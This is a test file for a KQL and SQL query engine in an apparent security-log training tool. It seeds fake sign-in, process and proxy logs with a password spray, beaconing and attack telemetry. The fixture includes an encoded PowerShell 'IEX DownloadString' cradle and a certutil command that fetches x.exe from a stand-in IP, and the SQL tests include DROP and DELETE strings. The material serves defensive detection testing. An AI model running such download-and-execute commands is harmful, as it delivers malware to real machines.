import { beforeAll, describe, expect, it } from 'vitest';
import { generateWorld } from '../src/core/world/world.ts';
import { CorpusBuilder } from '../src/core/logs/corpus.ts';
import { createRng } from '../src/core/rng.ts';
import { HOUR, MIN } from '../src/core/logs/time.ts';
import { SiemDatabase, toQueryError } from '../src/core/query/engine.ts';
import { tokenize, KqlError } from '../src/core/query/kql/lexer.ts';
import { transpileKql } from '../src/core/query/kql/transpile.ts';
import { TABLES } from '../src/core/logs/schema.ts';
import { guardSql } from '../src/core/query/sql-guard.ts';
import { kqlHas } from '../src/core/query/udf.ts';
import { utf16leBase64 } from '../src/core/synth/encoding.ts';
import { sqljs } from './helpers/sql.ts';

const NOW = Date.parse('2026-09-23T12:00:00Z');
const ENC = utf16leBase64("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')");

let db: SiemDatabase;

beforeAll(async () => {
  const world = generateWorld('query-fixture');
  const b = new CorpusBuilder({ world, rng: createRng('qf'), windowStart: NOW - 10 * HOUR, windowEnd: NOW, now: NOW });
  const u = world.people[0];
  const v = world.people[1];
  // 5 failures from one IP across two users, then a success.
  for (let i = 0; i < 5; i++) {
    b.signin({ TimeGenerated: NOW - 3 * HOUR + i * MIN, UserPrincipalName: i % 2 ? u.upn : v.upn, IPAddress: '203.0.113.50', ResultType: 50126, AppDisplayName: 'Office 365 Exchange Online', ClientAppUsed: 'IMAP4' });
  }
  b.signin({ TimeGenerated: NOW - 3 * HOUR + 10 * MIN, UserPrincipalName: u.upn, IPAddress: '203.0.113.50', ResultType: 0, AppDisplayName: 'Office 365 Exchange Online', ClientAppUsed: 'IMAP4' });
  b.signin({ TimeGenerated: NOW - 1 * HOUR, UserPrincipalName: v.upn, IPAddress: '198.51.100.7', ResultType: 0, AppDisplayName: 'Microsoft Teams', ClientAppUsed: 'Browser' });
  b.proc({ TimeGenerated: NOW - 2 * HOUR, DeviceName: u.laptop, AccountName: u.sam, FileName: 'powershell.exe', ProcessCommandLine: `powershell.exe -nop -w hidden -enc ${ENC}`, InitiatingProcessFileName: 'winword.exe' });
  b.proc({ TimeGenerated: NOW - 2 * HOUR + 30 * 1000, DeviceName: u.laptop, AccountName: 'SYSTEM', FileName: 'powershell.exe', ProcessCommandLine: 'powershell.exe -NoProfile -EncodedCommand AAAA', InitiatingProcessFileName: 'ccmexec.exe' });
  b.proc({ TimeGenerated: NOW - 2 * HOUR + 60 * 1000, DeviceName: u.laptop, AccountName: u.sam, FileName: 'Certutil.exe', ProcessCommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.9/x.txt C:\\ProgramData\\x.exe', InitiatingProcessFileName: 'cmd.exe' });
  // Beacon every 60s ±3s for 10 minutes.
  for (let i = 0; i < 10; i++) {
    b.proxy({ TimeGenerated: NOW - 30 * MIN + i * 60_000 + (i % 3) * 1000, SourceIP: '10.1.1.1', SourceUser: u.sam, Method: 'GET', Url: 'https://cdn-sync-x7k.net/c', DestinationHost: 'cdn-sync-x7k.net', DestinationIP: '203.0.113.9', StatusCode: 200, BytesSent: 300 + i, BytesReceived: 150, Category: 'Uncategorized' });
  }
  db = new SiemDatabase(await sqljs(), b.finalize());
});

const run = (kql: string) => db.run(kql, 'kql');
const values = (kql: string, col = 0) => run(kql).rows.map((r) => r[col]);

describe('lexer', () => {
  it('reads timespans, negated ops, hyphenated operators, verbatim strings and datetimes', () => {
    const toks = tokenize('T | project-away A | where x !contains "a" and y !in~ ("b") and t > ago(1.5h) and p == @"C:\\x" and d > datetime(2026-09-23T10:00:00Z)');
    const vals = toks.map((t) => `${t.kind}:${t.value}`);
    expect(vals).toContain('ident:project-away');
    expect(vals).toContain('op:!contains');
    expect(vals).toContain('op:!in~');
    expect(toks.find((t) => t.kind === 'timespan')?.num).toBe(5400);
    expect(vals).toContain('string:C:\\x');
    expect(vals).toContain('datetime:2026-09-23T10:00:00Z');
  });

  it('does not glue hyphens outside operator position', () => {
    const vals = tokenize('T | extend a = b - c').map((t) => t.value);
    expect(vals).toEqual(['T', '|', 'extend', 'a', '=', 'b', '-', 'c', '']);
  });

  it('reports unterminated strings with a position', () => {
    try {
      tokenize('T | where a == "oops');
      expect.unreachable();
    } catch (e) {
      expect(e).toBeInstanceOf(KqlError);
      expect((e as KqlError).start).toBe(15);
    }
  });
});

describe('transpiler errors', () => {
  const t = (src: string) => transpileKql(src, { now: '2026-09-23T12:00:00Z', tables: TABLES });
  const err = (src: string) => {
    try {
      t(src);
    } catch (e) {
      return toQueryError(e);
    }
    throw new Error('expected an error');
  };

  it('suggests tables and columns', () => {
    expect(err('SignInLogs | take 1').message).toMatch(/Did you mean SigninLogs/);
    const e = err('SigninLogs | where userprincipalname == "x"');
    expect(e.message).toMatch(/Did you mean UserPrincipalName\? \(column names are case-sensitive\)/);
    expect(e.start).toBe(19);
    expect(err('SigninLogs | where IPAdress == "x"').message).toMatch(/IPAddress/);
  });

  it('explains common mistakes', () => {
    expect(err('SigninLogs | where ResultType = 0').message).toMatch(/Use ==/);
    expect(err('SigninLogs | project count()').message).toMatch(/inside summarize/);
    expect(err('SigninLogs | extend p = prev(TimeGenerated)').message).toMatch(/sort by/);
    expect(err('SigninLogs | where TimeGenerated > 1h').message).toMatch(/ago/);
    expect(err('SigninLogs | frobnicate').message).toMatch(/Unknown or unsupported operator/);
    expect(err('SigninLogs | where City == Berlin').message).toMatch(/strings need quotes/);
  });
});

describe('KQL execution', () => {
  it('filters and counts', () => {
    expect(values('SigninLogs | where ResultType == 50126 | count')).toEqual([5]);
    expect(values('SigninLogs | where ResultType != 0 and IPAddress == "203.0.113.50" | count')).toEqual([5]);
  });

  it('summarizes with default and explicit names, sorts desc by default', () => {
    const r = run('SigninLogs | summarize count(), Users = dcount(UserPrincipalName) by IPAddress | sort by count_ | take 1');
    expect(r.columns.map((c) => c.name)).toEqual(['IPAddress', 'count_', 'Users']);
    expect(r.rows[0]).toEqual(['203.0.113.50', 6, 2]);
    expect(r.recordIdColumn).toBe(-1);
  });

  it('has matches whole terms; contains matches substrings', () => {
    expect(values('DeviceProcessEvents | where ProcessCommandLine has "-enc" | project AccountName').length).toBe(1);
    expect(values('DeviceProcessEvents | where ProcessCommandLine contains "-enc" | count')).toEqual([2]);
    expect(values('DeviceProcessEvents | where ProcessCommandLine !has "-enc" | count')).toEqual([2]);
    expect(kqlHas('a 203.0.113.9 b', '203.0.113.9', false)).toBe(true);
    expect(kqlHas('x-EncodedCommand', '-enc', false)).toBe(false);
  });

  it('distinguishes == (case-sensitive) from =~', () => {
    expect(values('DeviceProcessEvents | where FileName == "certutil.exe" | count')).toEqual([0]);
    expect(values('DeviceProcessEvents | where FileName =~ "certutil.exe" | count')).toEqual([1]);
    expect(values('DeviceProcessEvents | where FileName in~ ("CERTUTIL.EXE", "x") | count')).toEqual([1]);
    expect(values('DeviceProcessEvents | where InitiatingProcessFileName !in ("ccmexec.exe") | count')).toEqual([2]);
  });

  it('handles time: ago, between, bin, arithmetic, datetime_diff, prev', () => {
    expect(values('SigninLogs | where TimeGenerated > ago(2h) | count')).toEqual([1]);
    expect(values('SigninLogs | where TimeGenerated between (datetime(2026-09-23T08:59:00Z) .. datetime(2026-09-23T09:03:00Z)) | count')).toEqual([4]);
    const binned = run('SigninLogs | summarize count() by bin(TimeGenerated, 1h) | sort by TimeGenerated asc');
    expect(binned.rows).toEqual([
      ['2026-09-23T09:00:00Z', 6],
      ['2026-09-23T11:00:00Z', 1],
    ]);
    expect(values('SigninLogs | take 1 | extend Later = TimeGenerated + 5m | project Later')[0]).toMatch(/:05:00Z$|:0[5-9]:\d\dZ/);
    expect(values('SigninLogs | summarize Span = max(TimeGenerated) - min(TimeGenerated)')).toEqual([2 * 3600]);
    const gaps = values('WebProxy | where DestinationHost == "cdn-sync-x7k.net" | sort by TimeGenerated asc | extend Gap = datetime_diff("second", TimeGenerated, prev(TimeGenerated)) | where isnotnull(Gap) | summarize avg(Gap)');
    expect(gaps[0]).toBeGreaterThan(55);
    expect(gaps[0]).toBeLessThan(65);
    expect(values('WebProxy | summarize stdev(BytesSent)')[0]).toBeGreaterThan(2);
  });

  it('carries RecordId through row-preserving operators as a hidden column', () => {
    const r = run('SigninLogs | where ResultType == 0 | project TimeGenerated, IPAddress | sort by TimeGenerated asc');
    expect(r.columns.map((c) => c.name)).toEqual(['TimeGenerated', 'IPAddress', 'RecordId']);
    expect(r.columns[2].hidden).toBe(true);
    expect(r.recordIdColumn).toBe(2);
    expect(typeof r.rows[0][2]).toBe('string');
    const away = run('SigninLogs | project-away RecordId | take 1');
    expect(away.columns.find((c) => c.name === 'RecordId')?.hidden).toBe(true);
    expect(run('SigninLogs | distinct IPAddress').recordIdColumn).toBe(-1);
  });

  it('extend can reference earlier items, decode base64 and extract', () => {
    const r = run(
      'DeviceProcessEvents | where ProcessCommandLine has "-enc" | extend B64 = extract(@"-enc\\s+(\\S+)", 1, ProcessCommandLine), Decoded = base64_decode_tostring(B64) | project Decoded',
    );
    expect(r.rows[0][0]).toContain('DownloadString');
    expect(r.rows[0][0]).toContain('203.0.113.9');
  });

  it('top, distinct, make_set, let, iff, strcat, project-rename', () => {
    expect(values('SigninLogs | top 1 by TimeGenerated asc | project ResultType')).toEqual([50126]);
    expect(values('SigninLogs | distinct ClientAppUsed | sort by ClientAppUsed asc')).toEqual(['Browser', 'IMAP4']);
    expect(JSON.parse(String(values('SigninLogs | summarize make_set(ClientAppUsed)')[0])).sort()).toEqual(['Browser', 'IMAP4']);
    expect(values('let bad = 50126; let ips = dynamic(["203.0.113.50"]); SigninLogs | where ResultType == bad and IPAddress in (ips) | count')).toEqual([5]);
    expect(values('SigninLogs | extend Outcome = iff(ResultType == 0, "ok", "fail") | summarize count() by Outcome | sort by Outcome asc', 1)).toEqual([5, 2]); // fail, ok
    expect(values('SigninLogs | take 1 | project X = strcat(ClientAppUsed, "/", ResultType)')[0]).toMatch(/^IMAP4\/50126$/);
    expect(run('SigninLogs | project-rename SourceIp = IPAddress | take 1').columns.some((c) => c.name === 'SourceIp')).toBe(true);
  });

  it('joins with $left/$right and anti-joins', () => {
    const r = run('SigninLogs | where ResultType == 0 | join kind=inner (IdentityInfo | project AccountUpn, Department) on $left.UserPrincipalName == $right.AccountUpn | project UserPrincipalName, Department');
    expect(r.rows.length).toBe(2);
    expect(r.recordIdColumn).toBeGreaterThan(-1);
    const anti = values('IdentityInfo | join kind=leftanti (SigninLogs) on $left.AccountUpn == $right.UserPrincipalName | count');
    expect(Number(anti[0])).toBeGreaterThan(40);
  });

  it('search finds a term across tables with pinnable rows', () => {
    const r = run('search "203.0.113.9" | summarize count() by $table | sort by $table asc');
    expect(r.rows).toEqual([
      ['DeviceProcessEvents', 1],
      ['WebProxy', 10],
    ]);
    expect(run('search "203.0.113.9" | take 1').recordIdColumn).toBeGreaterThan(-1);
  });

  it('getschema describes columns; render is passed through', () => {
    const r = run('SigninLogs | getschema');
    expect(r.rows.some((row) => row[0] === 'MfaResult')).toBe(true);
    expect(run('SigninLogs | summarize count() by bin(TimeGenerated, 1h) | render timechart').render).toBe('timechart');
  });

  it('truncates large results and reports the total', () => {
    const r = db.run('IdentityInfo', 'kql', { maxRows: 10 });
    expect(r.rows.length).toBe(10);
    expect(r.truncated).toBe(true);
    expect(r.total).toBeGreaterThan(10);
  });
});

describe('SQL mode', () => {
  it('runs SELECT and CTEs', () => {
    expect(db.run('SELECT COUNT(*) AS n FROM SigninLogs WHERE ResultType = 50126;', 'sql').rows).toEqual([[5]]);
    expect(db.run("WITH x AS (SELECT IPAddress FROM SigninLogs) SELECT COUNT(DISTINCT IPAddress) FROM x", 'sql').rows[0][0]).toBe(2);
    const r = db.run('SELECT TimeGenerated, IsCompliant FROM SigninLogs LIMIT 1', 'sql');
    expect(r.columns.map((c) => c.type)).toEqual(['datetime', 'bool']);
  });

  it('is read-only and single-statement', () => {
    expect(() => guardSql('DELETE FROM SigninLogs')).toThrow(/read-only/);
    expect(() => guardSql('SELECT 1; DROP TABLE SigninLogs')).toThrow(/One statement/);
    expect(() => guardSql('WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x')).toThrow(/INSERT/);
    expect(guardSql("SELECT 'DROP TABLE x' AS s -- DELETE")).toContain('SELECT');
    expect(db.run("SELECT 'drop table x' AS s", 'sql').rows).toEqual([['drop table x']]);
  });

  it('surfaces SQLite errors helpfully', () => {
    expect(() => db.run('SELECT nope FROM SigninLogs', 'sql')).toThrow(/no such column/);
  });
});
